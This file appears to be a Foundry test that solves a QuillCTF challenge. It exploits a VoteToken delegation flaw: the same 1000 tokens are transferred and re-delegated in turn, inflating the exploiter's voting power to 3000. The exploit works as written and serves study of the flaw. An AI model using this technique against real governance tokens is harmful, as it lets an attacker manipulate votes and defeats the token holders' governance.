// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/QuillCTF/VoteToken.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract VoteTokenExploit is Test {
  VoteToken target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');
  address alice = makeAddr('alice');
  address bob = makeAddr('bob');
  address carl = makeAddr('carl');

  function setUp() public {
    vm.startPrank(deployer);
    target = new VoteToken();
    console2.log('Target contract deployed');
    target.mint(alice, 1000);
    console2.log('Alice receives 1000 tokens');
    vm.stopPrank();
  }

  function testExploit() public {
    getStats();

    vm.startPrank(alice);
    console2.log('Alice delegates its tokens to the exploiter');
    target.delegate(exploiter);

    console2.log('Alice sends its tokens to Bob');
    target.transfer(bob, 1000);
    vm.stopPrank();
    getStats();

    vm.startPrank(bob);
    console2.log('Bob delegates its tokens to the exploiter');
    target.delegate(exploiter);

    console2.log('Bob sends its tokens to Carl');
    target.transfer(carl, 1000);
    vm.stopPrank();
    getStats();

    vm.startPrank(carl);
    console2.log('Carl delegates its tokens to the exploiter');
    target.delegate(exploiter);

    console2.log('Carl sends its tokens the exploiter');
    target.transfer(exploiter, 1000);
    vm.stopPrank();
    getStats();

    assertEq(target.getVotes(exploiter), 3000);
    assertEq(target.balanceOf(exploiter), 1000);
  }

  function getAddressStats(string memory _name, address _address) public view {
    uint256 votes = target.getVotes(_address);
    uint256 tokens = target.balanceOf(_address);
    if (votes == 0) {
      if (tokens == 0) {
        console2.log('%s     %d votes        %d tokens', _name, votes, tokens);
      } else {
        console2.log('%s     %d votes     %d tokens', _name, votes, tokens);
      }
    } else {
      if (tokens == 0) {
        console2.log('%s  %d votes        %d tokens', _name, votes, tokens);
      } else {
        console2.log('%s  %d votes     %d tokens', _name, votes, tokens);
      }
    }
  }

  function getStats() public view {
    console2.log('\n  --------------- [STATS] ----------------');
    getAddressStats(unicode'üôç‚Äç‚ôÄÔ∏è Alice    ', alice);
    getAddressStats(unicode'üôé‚Äç‚ôÇÔ∏è Bob      ', bob);
    getAddressStats(unicode'üôé Carl     ', carl);
    getAddressStats(unicode'ü•∑ Exploiter', exploiter);
    console2.log('----------------------------------------\n');
  }
}
